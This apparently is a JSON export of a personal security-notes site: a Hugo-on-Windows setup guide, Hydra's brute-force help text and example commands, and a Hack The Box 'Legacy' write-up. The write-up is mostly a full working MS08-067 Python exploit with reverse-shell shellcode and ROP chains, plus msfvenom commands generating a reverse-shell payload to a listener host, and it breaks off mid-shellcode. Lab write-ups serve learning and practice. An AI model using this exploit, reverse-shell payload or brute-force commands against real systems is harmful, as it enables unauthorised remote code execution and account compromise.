	"content": " POWERSHELL Overview, how to install Hugo and how to set up the web pages using GitHub as repository in a WINDOWS environment. Since most of the commands have a Linux counterpart you could follow.\nFirst off id like to say I wish there was a way to do this with less command line. I initially tried setting it up on GITLAB but I just couldn\u0026rsquo;t find the material I need to do within windows.\nSetting up GitHub Create two repositories the first will be named YourSite(blog whatever you want). the second must be named the desired url I.E chickenpwny.github.io / YourSite.github.io\ngit clone https://github.com/YourSite.git\nInstalling GoLang in windows Windows GoLang  AFTER INSTALLING GOLANG need to setup Hogo the Content Management System CMS. To do this we will need a windows package manger I chose Scoop.\nIF IT HANGS JUST WAIT PANIENTLY FOR ATLEAST ONE MINUTE. mkdir c:\\Hugo\\bin cd c:\\Hugo\\bin Invoke-webRequest -Uri https://github.com/gohugoio/hugo/releases/download/v0.52/hugo_extended_0.52_Windows-64bit.zip -OutFile hugo_extended_0.52_Windows-64bit.zip Expand-Archive -Path .\\hugo_extended_0.52_Windows-64bit.zip -DestinationPath . scoop install unzip cd c:\\Hugo mkdir .\\sites cd .\\sites Now download \u0026amp; install scoop IEX(new-object net.webclient).downloadstring('https://get.scoop.sh') scoop install hugo hugo new site YourSite cd .\\yourSite cd .\\themes git submodule add https://github.com/vjeantet/hugo-theme-docdock.git themes\\hugo-theme-docdock Now we need to set some permission for the repository. If you skip this you may get errors uploading to the repo. submodule add https://github.com/YourSiteCHANGEME/YourSiteCHANGEME.github.io.git public \u0026ndash;  Note, the period before the backslash represents current directory same as in Linux.\nCovering some commands Before we move on from here\nCreate some new content: hugo new content\\first-post.md  To host your webpage locally : hugo server -D localhost  In the content directory adding the _index.md to a folder will make it a page on the site. You can add conent in the _index.md or just use it to name the directory. A little confusing just play around.\nLets say your done editing your content and you want publish your site.\nYou can use type Hugo to generate your site you must be in the root directory of YourSite. I\u0026rsquo;d recommend using the -t switch for theme. You dont need to supply the full path.\n hugo -t YourThemeName cd public git add . git commit -m \u0026quot;a\u0026quot; git push origin master  I had gotten confused initially and tried to upload the theme generator and thought it would generate the site on GitHub. Git hub needs index.html page, so eventually figured out that you generated the content locally then upload it. GitLab generates the content from the generator continuous deployment deal. Ithink GitHub offers it was well different guide.\n"
},
{
	"uri": "/tools/hydra/",
	"title": "Hydra",
	"tags": [],
	"description": "",
	"content": "Hydra is a WebApp Brutefocer. suupply it with the required information and it will enumrate logins based on customer login word list of you could use rock you.\nHydra v8.8 \u0026copy; 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PO RT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]] Options: -R restore a previous aborted/crashed session -I ignore an existing restore file (don't wait 10 seconds) -S perform an SSL connect -s PORT if the service is on a different default port, define it here -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE -p PASS or -P FILE try password PASS, or load several passwords from FILE -x MIN:MAX:CHARSET password bruteforce generation, type \u0026quot;-x -h\u0026quot; to get help -y disable use of symbols in bruteforce, see above -e nsr try \u0026quot;n\u0026quot; null password, \u0026quot;s\u0026quot; login as pass and/or \u0026quot;r\u0026quot; reversed login -u loop around users, not passwords (effective! implied with -x) -C FILE colon separated \u0026quot;login:pass\u0026quot; format, instead of -L/-P options -M FILE list of servers to attack, one entry per line, ':' to specify port -o FILE write found login/password pairs to FILE instead of stdout -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1 -f / -F exit when a login/pass pair is found (-M: -f per host, -F global) -t TASKS run TASKS number of connects in parallel per target (default: 16) -T TASKS run TASKS connects in parallel overall (for -M, default: 64) -w / -W TIME wait time for a response (32) / between connects per thread (0) -c TIME wait time per login attempt over all threads (enforces -t 1) -4 / -6 use IPv4 (default) / IPv6 addresses (put always in [] also in -M) -v / -V / -d verbose mode / show login+pass for each attempt / debug mode -O use old SSL v2 and v3 -q do not print messages about connection errors -U service module usage details -h more command line options (COMPLETE HELP) server the target: DNS, IP or 192.168.0.0/24 (this OR the -M option) service the service to crack (see below for supported protocols) OPT some service modules support additional input (-U for module help)  Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp\nHydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL v3.0. The newest version is always available at https://github.com/vanhauser-thc/thc-hydra Don\u0026rsquo;t use in military or secret service organizations, or for illegal purposes. These services were not compiled in: afp ncp oracle sapr3.\nUse HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup. E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://) % export HYDRA_PROXY=connect_and_socks_proxylist.txt (up to 64 entries) % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080 % export HYDRA_PROXY_HTTP=proxylist.txt (up to 64 entries)\nExamples: hydra -l user -P passlist.txt ftp://192.168.0.1 hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5 hydra -l admin -p password ftp://[192.168.0.0/24]/ hydra -L logins.txt -P pws.txt -M targets.txt ssh\n"
},
{
	"uri": "/hackthebox/boxes/legacy/",
	"title": "Legacy",
	"tags": [],
	"description": "",
	"content": " NMAP\nnmap -sC -sV -p 139,445 -oA nmap/scripts 10.10.10.4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-22 19:37 EST Nmap scan report for 10.10.10.4 Host is up (0.042s latency). PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: mean: -4h05m13s, deviation: 1h24m51s, median: -5h05m13s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:50:56:a4:5d:23 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2019-02-22T23:32:00+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 257.59 seconds  NMAP SCRIPT SMB-VULN\nnmap --script smb-vuln* -p 445 -oA nmap/smb_vulns 10.10.10.4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-22 19:50 EST Nmap scan report for 10.10.10.4 Host is up (0.041s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-vuln-cve2009-3103: | VULNERABLE: | SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497) | State: VULNERABLE | IDs: CVE:CVE-2009-3103 | Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2, | Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a | denial of service (system crash) via an \u0026amp; (ampersand) character in a Process ID High header field in a NEGOTIATE | PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location, | aka \u0026quot;SMBv2 Negotiation Vulnerability.\u0026quot; | | Disclosure date: 2009-09-08 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103 |_ http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103 | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: LIKELY VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, | Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary | code via a crafted RPC request that triggers the overflow during path canonicalization. | | Disclosure date: 2008-10-23 | References: | https://technet.microsoft.com/en-us/library/security/ms08-067.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx  SMBMAP\n/home/htb/boxes/legacy# smbmap -H 10.10.10.4 [+] Finding open SMB ports.... [+] User SMB session establishd on 10.10.10.4... [+] IP: 10.10.10.4:445 Name: 10.10.10.4 Disk Permissions ---- ----------- [!] Access Denied  ms08-067 #!/usr/bin/env python import struct import time import sys from threading import Thread # Thread is imported incase you would like to modify try: from impacket import smb from impacket import uuid #from impacket.dcerpc import dcerpc from impacket.dcerpc.v5 import transport except ImportError, _: print 'Install the following library to make this script work' print 'Impacket : https://github.com/CoreSecurity/impacket.git' print 'PyCrypto : https://pypi.python.org/pypi/pycrypto' sys.exit(1) print '#######################################################################' print '# MS08-067 Exploit' print '# This is a modified verion of Debasis Mohanty\\'s code (https://www.exploit-db.com/exploits/7132/).' print '# The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi' print '#' print '# Mod in 2018 by Andy Acer' print '# - Added support for selecting a target port at the command line.' print '# - Changed library calls to allow for establishing a NetBIOS session for SMB transport' print '# - Changed shellcode handling to allow for variable length shellcode.' print '#######################################################################\\n' print (''' $ This version requires the Python Impacket library version to 0_9_17 or newer. $ $ Here's how to upgrade if necessary: $ $ git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/ $ cd impacket $ pip install . ''') print '#######################################################################\\n' # ------------------------------------------------------------------------ # REPLACE THIS SHELLCODE with shellcode generated for your use # Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS. # # Example msfvenom commands to generate shellcode: # msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b \u0026quot;\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\u0026quot; -f c -a x86 --platform windows # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b \u0026quot;\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\u0026quot; -f c -a x86 --platform windows # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b \u0026quot;\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\u0026quot; -f c -a x86 --platform windows # Reverse TCP to 10.11.0.157 port 62000: shellcode=( \u0026quot;\\x31\\xc9\\x83\\xe9\\xaf\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\\x76\\x0e\u0026quot; \u0026quot;\\x42\\xf6\\xc3\\xef\\x83\\xee\\xfc\\xe2\\xf4\\xbe\\x1e\\x41\\xef\\x42\\xf6\u0026quot; \u0026quot;\\xa3\\x66\\xa7\\xc7\\x03\\x8b\\xc9\\xa6\\xf3\\x64\\x10\\xfa\\x48\\xbd\\x56\u0026quot; \u0026quot;\\x7d\\xb1\\xc7\\x4d\\x41\\x89\\xc9\\x73\\x09\\x6f\\xd3\\x23\\x8a\\xc1\\xc3\u0026quot; \u0026quot;\\x62\\x37\\x0c\\xe2\\x43\\x31\\x21\\x1d\\x10\\xa1\\x48\\xbd\\x52\\x7d\\x89\u0026quot; \u0026quot;\\xd3\\xc9\\xba\\xd2\\x97\\xa1\\xbe\\xc2\\x3e\\x13\\x7d\\x9a\\xcf\\x43\\x25\u0026quot; \u0026quot;\\x48\\xa6\\x5a\\x15\\xf9\\xa6\\xc9\\xc2\\x48\\xee\\x94\\xc7\\x3c\\x43\\x83\u0026quot; \u0026quot;\\x39\\xce\\xee\\x85\\xce\\x23\\x9a\\xb4\\xf5\\xbe\\x17\\x79\\x8b\\xe7\\x9a\u0026quot; \u0026quot;\\xa6\\xae\\x48\\xb7\\x66\\xf7\\x10\\x89\\xc9\\xfa\\x88\\x64\\x1a\\xea\\xc2\u0026quot; \u0026quot;\\x3c\\xc9\\xf2\\x48\\xee\\x92\\x7f\\x87\\xcb\\x66\\xad\\x98\\x8e\\x1b\\xac\u0026quot; \u0026quot;\\x92\\x10\\xa2\\xa9\\x9c\\xb5\\xc9\\xe4\\x28\\x62\\x1f\\x9e\\xf0\\xdd\\x42\u0026quot; \u0026quot;\\xf6\\xab\\x98\\x31\\xc4\\x9c\\xbb\\x2a\\xba\\xb4\\xc9\\x45\\x09\\x16\\x57\u0026quot; \u0026quot;\\xd2\\xf7\\xc3\\xef\\x6b\\x32\\x97\\xbf\\x2a\\xdf\\x43\\x84\\x42\\x09\\x16\u0026quot; \u0026quot;\\xbf\\x12\\xa6\\x93\\xaf\\x12\\xb6\\x93\\x87\\xa8\\xf9\\x1c\\x0f\\xbd\\x23\u0026quot; \u0026quot;\\x54\\x85\\x47\\x9e\\xc9\\xe4\\x42\\x6b\\xab\\xed\\x42\\x04\\xf3\\x66\\xa4\u0026quot; \u0026quot;\\x9c\\xd3\\xb9\\x15\\x9e\\x5a\\x4a\\x36\\x97\\x3c\\x3a\\xc7\\x36\\xb7\\xe3\u0026quot; \u0026quot;\\xbd\\xb8\\xcb\\x9a\\xae\\x9e\\x33\\x5a\\xe0\\xa0\\x3c\\x3a\\x2a\\x95\\xae\u0026quot; \u0026quot;\\x8b\\x42\\x7f\\x20\\xb8\\x15\\xa1\\xf2\\x19\\x28\\xe4\\x9a\\xb9\\xa0\\x0b\u0026quot; \u0026quot;\\xa5\\x28\\x06\\xd2\\xff\\xee\\x43\\x7b\\x87\\xcb\\x52\\x30\\xc3\\xab\\x16\u0026quot; \u0026quot;\\xa6\\x95\\xb9\\x14\\xb0\\x95\\xa1\\x14\\xa0\\x90\\xb9\\x2a\\x8f\\x0f\\xd0\u0026quot; \u0026quot;\\xc4\\x09\\x16\\x66\\xa2\\xb8\\x95\\xa9\\xbd\\xc6\\xab\\xe7\\xc5\\xeb\\xa3\u0026quot; \u0026quot;\\x10\\x97\\x4d\\x23\\xf2\\x68\\xfc\\xab\\x49\\xd7\\x4b\\x5e\\x10\\x97\\xca\u0026quot; \u0026quot;\\xc5\\x93\\x48\\x76\\x38\\x0f\\x37\\xf3\\x78\\xa8\\x51\\x84\\xac\\x85\\x42\u0026quot; \u0026quot;\\xa5\\x3c\\x3a\u0026quot; ) # ------------------------------------------------------------------------ # Gotta make No-Ops (NOPS) + shellcode = 410 bytes num_nops = 410 - len(shellcode) newshellcode = \u0026quot;\\x90\u0026quot; * num_nops newshellcode += shellcode # Add NOPS to the front shellcode = newshellcode # Switcheroo with the newshellcode temp variable #print \u0026quot;Shellcode length: %s\\n\\n\u0026quot; % len(shellcode) nonxjmper = \u0026quot;\\x08\\x04\\x02\\x00%s\u0026quot; + \u0026quot;A\u0026quot; * 4 + \u0026quot;%s\u0026quot; + \\ \u0026quot;A\u0026quot; * 42 + \u0026quot;\\x90\u0026quot; * 8 + \u0026quot;\\xeb\\x62\u0026quot; + \u0026quot;A\u0026quot; * 10 disableNXjumper = \u0026quot;\\x08\\x04\\x02\\x00%s%s%s\u0026quot; + \u0026quot;A\u0026quot; * \\ 28 + \u0026quot;%s\u0026quot; + \u0026quot;\\xeb\\x02\u0026quot; + \u0026quot;\\x90\u0026quot; * 2 + \u0026quot;\\xeb\\x62\u0026quot; ropjumper = \u0026quot;\\x00\\x08\\x01\\x00\u0026quot; + \u0026quot;%s\u0026quot; + \u0026quot;\\x10\\x01\\x04\\x01\u0026quot;; module_base = 0x6f880000 def generate_rop(rvas): gadget1 = \u0026quot;\\x90\\x5a\\x59\\xc3\u0026quot; gadget2 = [\u0026quot;\\x90\\x89\\xc7\\x83\u0026quot;, \u0026quot;\\xc7\\x0c\\x6a\\x7f\u0026quot;, \u0026quot;\\x59\\xf2\\xa5\\x90\u0026quot;] gadget3 = \u0026quot;\\xcc\\x90\\xeb\\x5a\u0026quot; ret = struct.pack('\u0026lt;L', 0x00018000) ret += struct.pack('\u0026lt;L', rvas['call_HeapCreate'] + module_base) ret += struct.pack('\u0026lt;L', 0x01040110) ret += struct.pack('\u0026lt;L', 0x01010101) ret += struct.pack('\u0026lt;L', 0x01010101) ret += struct.pack('\u0026lt;L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base) ret += struct.pack('\u0026lt;L', rvas['pop ecx / ret'] + module_base) ret += gadget1 ret += struct.pack('\u0026lt;L', rvas['mov [eax], ecx / ret'] + module_base) ret += struct.pack('\u0026lt;L', rvas['jmp eax'] + module_base) ret += gadget2[0] ret += gadget2[1] ret += struct.pack('\u0026lt;L', rvas[ 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base) ret += struct.pack('\u0026lt;L', rvas['pop ecx / ret'] + module_base) ret += gadget2[2] ret += struct.pack('\u0026lt;L', rvas['mov [eax+0x10], ecx / ret'] + module_base) ret += struct.pack('\u0026lt;L', rvas['add eax, 8 / ret'] + module_base) ret += struct.pack('\u0026lt;L', rvas['jmp eax'] + module_base) ret += gadget3 return ret class SRVSVC_Exploit(Thread): def __init__(self, target, os, port=445): super(SRVSVC_Exploit, self).__init__() # MODIFIED HERE # Changed __port to port ... not sure if that does anything. I'm a newb. self.port = port self.target = target self.os = os def __DCEPacket(self): if (self.os == '1'): print 'Windows XP SP0/SP1 Universal\\n' ret = \u0026quot;\\x61\\x13\\x00\\x01\u0026quot; jumper = nonxjmper % (ret, ret) elif (self.os == '2'): print 'Windows 2000 Universal\\n' ret = \u0026quot;\\xb0\\x1c\\x1f\\x00\u0026quot; jumper = nonxjmper % (ret, ret) elif (self.os == '3'): print 'Windows 2003 SP0 Universal\\n' ret = \u0026quot;\\x9e\\x12\\x00\\x01\u0026quot; # 0x01 00 12 9e jumper = nonxjmper % (ret, ret) elif (self.os == '4'): print 'Windows 2003 SP1 English\\n' ret_dec = \u0026quot;\\x8c\\x56\\x90\\x7c\u0026quot; # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL ret_pop = \u0026quot;\\xf4\\x7c\\xa2\\x7c\u0026quot; # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL jmp_esp = \u0026quot;\\xd3\\xfe\\x86\\x7c\u0026quot; # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL disable_nx = \u0026quot;\\x13\\xe4\\x83\\x7c\u0026quot; # 0x 7c 83 e4 13 NX disable @NTDLL.DLL jumper = disableNXjumper % ( ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2) elif (self.os == '5'): print 'Windows XP SP3 French (NX)\\n' ret = \u0026quot;\\x07\\xf8\\x5b\\x59\u0026quot; # 0x59 5b f8 07 disable_nx = \u0026quot;\\xc2\\x17\\x5c\\x59\u0026quot; # 0x59 5c 17 c2 # the nonxjmper also work in this case. jumper = nonxjmper % (disable_nx, ret) elif (self.os == '6'): print 'Windows XP SP3 English (NX)\\n' ret = \u0026quot;\\x07\\xf8\\x88\\x6f\u0026quot; # 0x6f 88 f8 07 disable_nx = \u0026quot;\\xc2\\x17\\x89\\x6f\u0026quot; # 0x6f 89 17 c2 # the nonxjmper also work in this case. jumper = nonxjmper % (disable_nx, ret) elif (self.os == '7'): print 'Windows XP SP3 English (AlwaysOn NX)\\n' rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6, 'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64} # the nonxjmper also work in this case. jumper = generate_rop(rvasets) + \u0026quot;AB\u0026quot; else: print 'Not supported OS version\\n' sys.exit(-1) print '[-]Initiating connection' # MORE MODIFICATIONS HERE ############################################################################################# if (self.port == '445'): self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\\\pipe\\\\browser]' % self.target) else: # DCERPCTransportFactory doesn't call SMBTransport with necessary parameters. Calling directly here. # *SMBSERVER is used to force the library to query the server for its NetBIOS name and use that to # establish a NetBIOS Session. The NetBIOS session shows as NBSS in Wireshark. self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename = '\\\\browser' ) self.__trans.connect() print '[-]connected to ncacn_np:%s[\\\\pipe\\\\browser]' % self.target self.__dce = self.__trans.DCERPC_class(self.__trans) self.__dce.bind(uuid.uuidtup_to_bin( ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0'))) path = \u0026quot;\\x5c\\x00\u0026quot; + \u0026quot;ABCDEFGHIJ\u0026quot; * 10 + shellcode + \u0026quot;\\x5c\\x00\\x2e\\x00\\x2e\\x00\\x5c\\x00\\x2e\\x00\\x2e\\x00\\x5c\\x00\u0026quot; + \\ \u0026quot;\\x41\\x00\\x42\\x00\\x43\\x00\\x44\\x00\\x45\\x00\\x46\\x00\\x47\\x00\u0026quot; + jumper + \u0026quot;\\x00\u0026quot; * 2 server = \u0026quot;\\xde\\xa4\\x98\\xc5\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x41\\x00\\x42\\x00\\x43\\x00\\x44\\x00\\x45\\x00\\x46\\x00\\x47\\x00\\x00\\x00\u0026quot; prefix = \u0026quot;\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x5c\\x00\\x00\\x00\u0026quot; # NEW HOTNESS # The Path Length and the \u0026quot;Actual Count\u0026quot; SMB parameter have to match. Path length in bytes # is double the ActualCount field. MaxCount also seems to match. These fields in the SMB protocol # store hex values in reverse byte order. So: 36 01 00 00 =\u0026gt; 00 00 01 36 =\u0026gt; 310. No idea why it's \u0026quot;doubled\u0026quot; # from 310 to 620. 620 = 410 shellcode + extra stuff in the path. MaxCount = \u0026quot;\\x36\\x01\\x00\\x00\u0026quot; # Decimal 310. =\u0026gt; Path length of 620. Offset = \u0026quot;\\x00\\x00\\x00\\x00\u0026quot; ActualCount = \u0026quot;\\x36\\x01\\x00\\x00\u0026quot; # Decimal 310. =\u0026gt; Path length of 620 self.__stub = server + MaxCount + Offset + ActualCount + \\ path + \u0026quot;\\xE8\\x03\\x00\\x00\u0026quot; + prefix + \u0026quot;\\x01\\x10\\x00\\x00\\x00\\x00\\x00\\x00\u0026quot; return def run(self): self.__DCEPacket() self.__dce.call(0x1f, self.__stub) time.sleep(3) print 'Exploit finish\\n' if __name__ == '__main__': try: target = sys.argv[1] os = sys.argv[2] port = sys.argv[3] except IndexError: print '\\nUsage: %s \u0026lt;target ip\u0026gt; \u0026lt;os #\u0026gt; \u0026lt;Port #\u0026gt;\\n' % sys.argv[0] print 'Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445' print 'Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)' print 'Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal' print 'Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English' print 'Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)' print 'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)' print 'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)' print '' print 'FYI: nmap has a good OS discovery script that pairs well with this exploit:' print 'nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1' print '' sys.exit(-1) current = SRVSVC_Exploit(target, os, port) current.start()  MSFVENOM\nhttps://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-08-067\n msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b \u0026quot;\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\u0026quot; -f py -v shellcode -a x86 --platform windows Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai failed with A valid opcode permutation could not be found. Attempting to encode payload with 1 iterations of generic/none generic/none failed with Encoding failed due to a bad character (index=3, char=0x00) Attempting to encode payload with 1 iterations of x86/call4_dword_xor x86/call4_dword_xor succeeded with size 348 (iteration=0) x86/call4_dword_xor chosen with final size 348 Payload size: 348 bytes Final size of py file: 1872 bytes shellcode = \u0026quot;\u0026quot; shellcode += \u0026quot;\\x29\\xc9\\x83\\xe9\\xaf\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\u0026quot; shellcode += \u0026quot;\\x81\\x76\\x0e\\xae\\xf1\\xdb\\xb3\\x83\\xee\\xfc\\xe2\\xf4\u0026quot; shellcode += \u0026quot;\\x52\\x19\\x59\\xb3\\xae\\xf1\\xbb\\x3a\\x4b\\xc0\\x1b\\xd7\u0026quot; shellcode += \u0026quot;\\x25\\xa1\\xeb\\x38\\xfc\\xfd\\x50\\xe1\\xba\\x7a\\xa9\\x9b\u0026quot; shellcode += \u0026quot;\\xa1\\x46\\x91\\x95\\x9f\\x0e\\x77\\x8f\\xcf\\x8d\\xd9\\x9f\u0026quot; shellcode += \u0026quot;\\x8e\\x30\\x14\\xbe\\xaf\\x36\\x39\\x41\\xfc\\xa6\\x50\\xe1\u0026quot; shellcode += \u0026quot;\\xbe\\x7a\\x91\\x8f\\x25\\xbd\\xca\\xcb\\x4d\\xb9\\xda\\x62\u0026quot; shellcode += \u0026quot;\\xff\\x7a\\x82\\x93\\xaf\\x22\\x50\\xfa\\xb6\\x12\\xe1\\xfa\u0026quot; shellcode += \u0026quot;\\x25\\xc5\\x50\\xb2\\x78\\xc0\\x24\\x1f\\x6f\\x3e\\xd6\\xb2\u0026quot; shellcode += \u0026quot;\\x69\\xc9\\x3b\\xc6\\x58\\xf2\\xa6\\x4b\\x95\\x8c\\xff\\xc6\u0026quot; shellcode += \u0026quot;\\x4a\\xa9\\x50\\xeb\\x8a\\xf0\\x08\\xd5\\x25\\xfd\\x90\\x38\u0026quot; shellcode += \u0026quot;\\xf6\\xed\\xda\\x60\\x25\\xf5\\x50\\xb2\\x7e\\x78\\x9f\\x97\u0026quot; shellcode += \u0026quot;\\x8a\\xaa\\x80\\xd2\\xf7\\xab\\x8a\\x4c\\x4e\\xae\\x84\\xe9\u0026quot; shellcode += \u0026quot;\\x25\\xe3\\x30\\x3e\\xf3\\x99\\xe8\\x81\\xae\\xf1\\xb3\\xc4\u0026quot; shellcode += \u0026quot;\\xdd\\xc3\\x84\\xe7\\xc6\\xbd\\xac\\x95\\xa9\\x0e\\x0e\\x0b\u0026quot; shellcode += \u0026quot;\\x3e\\xf0\\xdb\\xb3\\x87\\x35\\x8f\\xe3\\xc6\\xd8\\x5b\\xd8\u0026quot; shellcode += \u0026quot;\\xae\\x0e\\x0e\\xe3\\xfe\\xa1\\x8b\\xf3\\xfe\\xb1\\x8b\\xdb\u0026quot; shellcode += \u0026quot;\\x44\\xfe\\x04\\x53\\x51\\x24\\x4c\\xd9\\xab\\x99\\xd1\\xb9\u0026quot; shellcode += \u0026quot;\\xa0\\xff\\xb3\\xb1\\xae\\xf0\\x60\\x3a\\x48\\x9b\\xcb\\xe5\u0026quot; shellcode += \u0026quot;\\xf9\\x99\\x42\\x16\\xda\\x90\\x24\\x66\\x2b\\x31\\xaf\\xbf\u0026quot; shellcode += \u0026quot;\\x51\\xbf\\xd3\\xc6\\x42\\x99\\x2b\\x06\\x0c\\xa7\\x24\\x66\u0026quot; shellcode += \u0026quot;\\xc6\\x92\\xb6\\xd7\\xae\\x78\\x38\\xe4\\xf9\\xa6\\xea\\x45\u0026quot; shellcode += \u0026quot;\\xc4\\xe3\\x82\\xe5\\x4c\\x0c\\xbd\\x74\\xea\\xd5\\xe7\\xb2\u0026quot; shellcode += \u0026quot;\\xaf\\x7c\\x9f\\x97\\xbe\\x37\\xdb\\xf7\\xfa\\xa1\\x8d\\xe5\u0026quot; shellcode += \u0026quot;\\xf8\\xb7\\x8d\\xfd\\xf8\\xa7\\x88\\xe5\\xc6\\x88\\x17\\x8c\u0026quot; shellcode += \u0026quot;\\x28\\x0e\\x0e\\x3a\\x4e\\xbf\\x8d\\xf5\\x51\\xc1\\xb3\\xbb\u0026quot; shellcode += \u0026quot;\\x29\\xec\\xbb\\x4c\\x7b\\x4a\\x3b\\xae\\x84\\xfb\\xb3\\x15\u0026quot; shellcode += 